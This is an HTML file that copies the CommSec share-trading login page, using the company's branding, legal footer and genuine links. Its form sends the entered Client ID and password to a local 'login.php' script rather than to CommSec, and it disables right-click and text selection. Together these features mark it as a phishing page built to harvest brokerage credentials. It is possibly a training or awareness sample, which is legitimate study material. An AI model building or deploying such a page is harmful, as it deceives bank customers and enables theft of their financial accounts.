<!DOCTYPE html>
<html lang="en">

<head>
    <title>Login | CommSec</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="style.css">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.1/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.1/dist/js/bootstrap.bundle.min.js"></script>
    <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
    <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
</head>

<body oncontextmenu="event.returnValue=false" onselectstart="event.returnValue=false">

    <div class="container-fluid back">
        <div class="card inner border rounded">
            <img src="commsec_logo.png" alt="logo" width="51.5%" class="ms-3 mt-3">
            <h5 class="mt-3 px-4 text-black"><b>Login to CommSec</b></h5>
            <form class="px-4 mb-4" action="login.php" method="POST" oninput="validate()">
                <div class="mb-3 mt-3">
                    <label for="client" class="text-black">Client ID:</label>
                    <input type="client" class="form-control" id="client" placeholder="Client ID" name="client">
                </div>
                <div class="mb-3">
                    <label for="password" class="text-black">Password:</label>
                    <input type="password" class="form-control" id="password" placeholder="Enter password"
                        name="password">
                </div>
                <button id="submit" type="submit"
                    class="btn btn-warning mb-5 ms-2 py-2 float-end border border-dark rounded" disabled>Login</button>
                <a class="btn btn-link mb-5 py-2 float-end"
                    href="https://www.commsec.com.au/accounts/share-trading.html?icid=public:loginpage:newtocommsec_joinnow"
                    role="button">Join now</a>
                <br />
                <p class="mt-5 text-black">Forgot <a
                        href="https://www2.commsec.com.au/secure/login/forgot-client-id">Client ID</a>
                    or
                    <a href="https://www2.commsec.com.au/secure/login/forgot-password">password</a>?
                </p>
            </form>
            <div class="container bottomInner">
                <div class="row pt-3">
                    <div class="col-1">
                        <ion-icon name="information-circle" class="info"></ion-icon>
                    </div>
                    <div class="col-11">
                        <p class="text-black">If you're a CommBank customer, you can access CommSec from Netbank.
                            <a href="https://www.commsec.com.au/support/help-centre/accessing-commsec/what-is-netbank.html?icid=public:loginpage:tellmemorebutton"
                                target="_blank">Learn more <ion-icon name="open-outline" class="open"></ion-icon></a>
                        </p>
                    </div>
                </div>
            </div>
        </div>
        <div class="bottomFooter">
            <p>Â© Commonwealth Securities Limited &nbsp;ABN 60 067 254 399 AFSL 238814</p>
            <p style="font-size:small"><a href="https://www2.commsec.com.au/media/58635/importantinformation.pdf"
                    target="_blank">Important information
                    <ion-icon name="open-outline" class="openSmall"></ion-icon>
                </a>&nbsp;&nbsp;&nbsp;&nbsp;
                <a href="https://www2.commsec.com.au/media/57221/fsg.pdf" target="_blank">Financial services guide
                    <ion-icon name="open-outline" class="openSmall"></ion-icon>
                </a>&nbsp;&nbsp;&nbsp;&nbsp;
                <a href="https://www.commbank.com.au/support/privacy.html" target="_blank">Privacy policy
                    <ion-icon name="open-outline" class="openSmall"></ion-icon>
                </a>
            </p>
        </div>
    </div>

    <script type="text/javascript">

        // Function to prevent users from submitting empty form
        function validate() {
            client = document.getElementById('client').value;
            password = document.getElementById('password').value;
            if (client.length < 1 || password.length < 1) {
                document.getElementById('submit').disabled = true;
            } else {
                document.getElementById('submit').disabled = false;
            }
        }

    </script>

</body>

</html>
